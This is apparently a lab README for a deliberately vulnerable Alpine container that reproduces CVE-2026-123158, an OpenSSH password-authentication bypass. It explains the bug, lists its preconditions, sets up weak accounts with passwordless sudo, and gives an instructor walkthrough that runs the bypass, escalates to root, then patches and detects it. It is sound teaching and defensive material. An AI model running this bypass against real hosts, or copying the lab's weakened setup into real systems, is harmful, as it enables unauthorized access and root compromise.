# web-03 — Alpine Linux + CVE-2026-123158 (*sshole)

> **Intentionally vulnerable lab host.** `web-03` is built with OpenSSH
> `9.9_p2-r0` on Alpine 3.21 (musl, no PAM) so students can reproduce
> **CVE-2026-123158**, an OpenSSH password-authentication bypass.
> Keep it on the lab network (`lablan`) / `localhost:2213` only.
> Never expose it to the internet, never push the image publicly, and
> patch it (`apk upgrade`) or rebuild it after the lab.

| | |
|---|---|
| Service | `web-03` (`compose.yml`, context `./web-alpine`) |
| Address | `172.26.0.13` on `lablan`, host port `2213 → 22` |
| OS | Alpine 3.21.10 base, musl libc, BusyBox |
| OpenSSH | **9.9p2-r0 — vulnerable** (fixed: `9.9_p2-r1` on 3.21) |
| Accounts | `ubuntu` (`$6$…` hash, password `pass123`) + `alpine` (`*`, key-only) |
| CVE | CVE-2026-123158, CVSS 3.1 **8.1 High**, aka *\*sshole* |

---

## 1. The vulnerability in one paragraph

Since **2016**, OpenSSH's `sshd` has *borrowed another account's salt*
when checking a password for an account that has no usable hash, to
keep response times constant (a fix for CVE-2016-6210, username
enumeration by timing). Since **2012**, musl's `crypt()` returns the
single-character string `"*"` when it fails — including when the
supplied password is longer than **256 bytes**, because musl caps
SHA-crypt keys at 256 bytes for DoS protection. An account with no
password has `"*"` in `/etc/shadow`. So on a musl system without PAM:
send a **257–1024 byte password** to a `*` account, musl `crypt()`
fails and returns `"*"`, sshd compares `"*"` to the stored `"*"`,
and the login is **accepted** — in one connection, with no knowledge
of any password. Reported by Özgün Kültekin (Wakefield), fixed in
OpenSSH **10.6p2** (2026-11-05), backported by Alpine to every branch
3.16 → edge.

## 2. Preconditions — all five must hold

| # | Condition | web-03 | web-01 (Ubuntu control) |
|---|---|---|---|
| 1 | musl libc | ✅ Alpine | ❌ glibc |
| 2 | sshd without PAM | ✅ `openssh-server` default | ❌ PAM |
| 3 | `PasswordAuthentication yes` | ✅ default | ✅ |
| 4 | Target account with `*` in `/etc/shadow` | ✅ `alpine` (key-only) | — |
| 5 | Another account with a `$5$`/`$6$` hash (salt to borrow) | ✅ `ubuntu` | — |

Remove any one condition and thesame attack fails — that is the
teaching point: the bug is an *interaction* between three reasonable
decisions made years apart (musl `crypt()` returning `"*"` in 2012,
OpenSSH salt-borrowing in 2016, Alpine switching `root:!` → `root:*`
in 2022 so keys work without PAM).

**Who is not affected:** Debian/Ubuntu/Fedora (glibc), anything using
PAM for password auth, `PasswordAuthentication no`, accounts locked
with `!`, Dropbear, OpenBSD. Your `web-01`/`web-02`/`lb-01` are the
control group: the identical attack against them must fail.

## 3. How it works, step by step

```
pw_password = "*"                          # alpine has no password (key-only)
salt = NULL                                # "*" is too short to contain a salt
salt = pick_salt()                         # sshd borrows ubuntu's: "$6$<salt>$"
hash = crypt("AAAA…x300", "$6$<salt>$")   # musl: key > 256 bytes -> returns "*"
strcmp(hash, pw_password) == 0             # "*" == "*"
return 1                                   # welcome, alpine
```

The code path (`OpenSSH 9.9p2`, `auth-passwd.c` → `openbsd-compat/xcrypt.c`):

1. `sys_auth_passwd()` calls `shadow_pw()` to get the stored field.
   For `alpine` that is `"*"`. Because `pw_password[1] == '\0'`, no
   salt is taken from it (`salt` stays `NULL`).
2. `xcrypt(password, NULL)` calls `pick_salt()`, which walks
   `/etc/passwd`/`/etc/shadow` (`getpwent()` + `getspnam()`) and
   copies the settings prefix of the first `$5$`/`$6$` hash it finds
   — here `ubuntu`'s `$6$raRv…$`. The result is cached in a
   `static char salt[32]`.
3. `crypt()` (musl) hashes the 300-byte candidate with that salt.
   musl's SHA-512-crypt refuses keys > 256 bytes and returns `"*"`.
4. `strcmp("*", "*") == 0` → authentication succeeds.

### The two-attempt quirk (why the PoC sends "wrong" first)

`pick_salt()` does `explicit_bzero(passwd, strlen(passwd))` on the
donor hash it found. On musl, `getspnam()` returns a pointer into a
**static buffer**, so that `bzero` also erases the target account's
stored `"*"` (now `""`) on the *first* attempt — the comparison
fails. But `pick_salt()`'s result is cached in the static `salt`
variable, and the sshd monitor process lives for the whole TCP
connection. On the **second attempt on the same connection**,
`pick_salt()` returns the cached salt immediately, touches no shadow
buffer, `pw_password` is still `"*"`, and the bypass succeeds.

That is why `sshhole_demo.py` (and the original PoC) use **one
connection, two password attempts**: first `"wrong"` (primes the
cache), then `"A" × 300`. A fresh connection per attempt will *not*
work — a nice detail to point out in class.

### Why the fix works

OpenSSH 10.6p2 makes sshd **reject a stored field that is too short
to be a real hash** before comparing, and stops using a pointer into
libc's static buffer. Alpine backported the same check to
`9.9_p2-r1` (3.21). After the fix, `crypt()` returning `"*"` can
never match a stored `"*"` again.

## 4. The lab setup (what `web-alpine/Dockerfile` does)

```dockerfile
FROM alpine:3.21
# download the pre-fix r0 .apk files directly from the Alpine CDN
# (the repo index now only lists the fixed r1, so `apk add
#  openssh-server=9.9_p2-r0` would fail — see Dockerfile comments)
# ... install all 7 openssh sub-packages at 9.9_p2-r0, verify version
```

1. **Pinned vulnerable OpenSSH.** Alpine's mirrors now serve only the
   fixed `9.9_p2-r1` in the package index, but the pre-fix `r0` `.apk`
   files are still on `dl-cdn.alpinelinux.org`. The Dockerfile
   `wget`s all seven sub-packages
   (`openssh`, `-client-common`, `-client-default`, `-server-common`,
   `-server`, `-keygen`, `-sftp-server`) at `9.9_p2-r0` and installs
   them with `apk add --allow-untrusted`. It then **asserts** the
   installed version is exactly `9.9_p2-r0` and fails the build
   otherwise — a patched image must never silently replace the lab
   image. If Alpine removes the orphaned `r0` files, the build fails
   loudly at the `wget`, which is the intended behaviour.
2. **Two accounts** (both shadow states are required):
   - `ubuntu` — `chpasswd` sets a real `$6$` hash → the *donor* whose
     salt `pick_salt()` borrows. Normal password login works.
   - `alpine` — `usermod -p '*'` → the *target*. Key login works
     (demo key at `/home/alpine/demo_key` inside the container,
     extract with `docker cp web-03:/home/alpine/demo_key ./`);
     password login should be impossible — until it isn't.
   - `root` stays `root:*` with `PermitRootLogin prohibit-password`
     (key-only), showing that default still protects root itself.
3. **Privilege escalation for impact:** `alpine` has passwordless
   `sudo` and `doas` (`permit nopass alpine as root`), mirroring
   Alpine's official tiny-cloud images where the default `alpine`
   user + passwordless `doas` = instant root.
4. **sshd:** `PasswordAuthentication yes`, no PAM package installed
   (do *not* install `openssh-server-pam`), `CMD sshd -D -e` so
   `docker logs web-03` shows auth attempts live.

Also included: `download-vulnerable-alpine.sh` — a `wget` for the
**Alpine 3.21.9 ISO** (`alpine-standard-3.21.9-x86_64.iso`, the last
pre-fix 3.21 release, ~280 MB, with SHA-256 verification) for
students who want to reproduce the bug on bare metal / in a VM
instead of (or in addition to) the container. The ISO is not
committed to git.

## 5. Demonstration script (instructor walkthrough, ~30 min)

Prereqs on the host: `pip install paramiko` (or use `sshpass`).
Start the lab: `docker compose up -d --build web-03`.

### Step 0 — Verify the preconditions (2 min)

```bash
docker exec web-03 sh -c '
  cat /etc/alpine-release
  apk info -v | grep openssh
  /usr/sbin/sshd -T | grep -Ei "passwordauthentication|permitrootlogin"
  awk -F: "$2==\"*\" {print $1}" /etc/shadow
  awk -F: "$2 ~ /^\$[56]\$/ {print $1}" /etc/shadow
  ldd /usr/sbin/sshd | grep musl'
# 3.21.10 / openssh-server-9.9_p2-r0 / passwordauthentication yes
# * accounts: root, alpine / hashed accounts: ubuntu
```

### Step 1 — Baselines that must work / must fail (5 min)

```bash
sshpass -p pass123 ssh -p 2213 ubuntu@localhost 'id'        # works (real password)
ssh -i <demo_key> -p 2213 alpine@localhost 'id'             # works (key)
sshpass -p wrong ssh -p 2213 alpine@localhost              # fails (short password)
```

### Step 2 — The bypass (5 min)

```bash
python3 web-alpine/sshhole_demo.py            # localhost:2213, alpine, 300 x A
python3 web-alpine/sshhole_demo.py localhost 2213 alpine 256   # rejected
python3 web-alpine/sshhole_demo.py localhost 2213 alpine 257   # ACCEPTED
```

Explain the two attempts on one connection (see §3). Show
`docker logs web-03` — `Accepted password for alpine` for an account
that has no password is the tell-tale sign. Show the privesc:
the demo lands as `alpine`, then `sudo -n id` → `uid=0(root)`.

### Step 3 — Controls: same attack, immune hosts (5 min)

```bash
python3 web-alpine/sshhole_demo.py localhost 2211 ubuntu 300   # web-01 Ubuntu: rejected
python3 web-alpine/sshhole_demo.py localhost 2213 ubuntu 300   # hashed account: rejected
```

glibc, PAM, and a real hash each independently block the bug.
Change one precondition at a time and re-run to prove it.

### Step 4 — Fix and re-test (10 min)

```bash
docker exec web-03 apk upgrade -U -a     # openssh 9.9_p2-r0 -> r1 (fixed)
docker restart web-03                     # restart matters: the running
                                          # sshd is still the old binary
python3 web-alpine/sshhole_demo.py        # now rejected
```

Note: the upgrade lives in the container's writable layer. To get
the vulnerable image back for the next class,
`docker compose up -d --force-recreate web-03` (plain `--build` will
not recreate a running container, so the patched layer survives).

Workaround (without upgrading), per Alpine/OpenSSH/musl advisories:

```bash
docker exec web-03 sh -c \
  'echo "PasswordAuthentication no" > /etc/ssh/sshd_config.d/00-no-passwords.conf'
docker restart web-03
# long password now rejected; key login still works — verify both
```

Detection on a real host: `grep 'Accepted password for' /var/log/messages`
naming a `*` account (`alpine`, `root`, any key-only user) means the
host was compromised — rebuild it, don't just clean it.

### Step 5 — Discussion prompts

- Why did this survive from 2016 to 2026? (musl doesn't test sshd;
  distros test on glibc; PAM never calls `crypt()` for `*` accounts;
  the `pick_salt()` static-buffer interaction needed the two-attempt
  shape to be noticed.)
- The fix is in sshd even though the root cause is "outside sshd"
  (musl returning `"*"`) — who should own a bug like this?
- `root:*` + `PermitRootLogin prohibit-password` didn't save the
  box, because the *other* `*` account (`alpine` + `doas`) gave root
  anyway. What does that say about auditing key-only accounts?
- Key-only SSH (`PasswordAuthentication no`) would have made this
  entire CVE irrelevant. Why is it still not the default everywhere?

## 6. References

- Alpine security advisory (2026-11-05):
  <https://alpinelinux.org/posts/2026-11-05-openssh-password-authentication-bypass/>
- Alpine security tracker: <https://security.alpinelinux.org/vuln/CVE-2026-123158>
- NVD / MITRE: <https://nvd.nist.gov/vuln/detail/CVE-2026-123158> (CVSS 3.1 8.1)
- OpenSSH 10.6p2 release notes: <https://www.openssh.com/releasenotes.html>
- Researcher's write-up & PoC: <https://sshhole.com/> ·
  <https://github.com/oz9un/sshole> (MIT)
- Fixed versions per Alpine branch: edge `10.6_p2-r0`, 3.24 `10.3_p1-r2`,
  3.23 `10.2_p1-r1`, 3.22 `10.0_p1-r11`, **3.21 `9.9_p2-r1`**,
  3.20 `9.7_p1-r6`, 3.19 `9.6_p1-r3`, 3.18 `9.3_p2-r4`,
  3.17 `9.1_p1-r7`, 3.16 `9.0_p1-r6`.
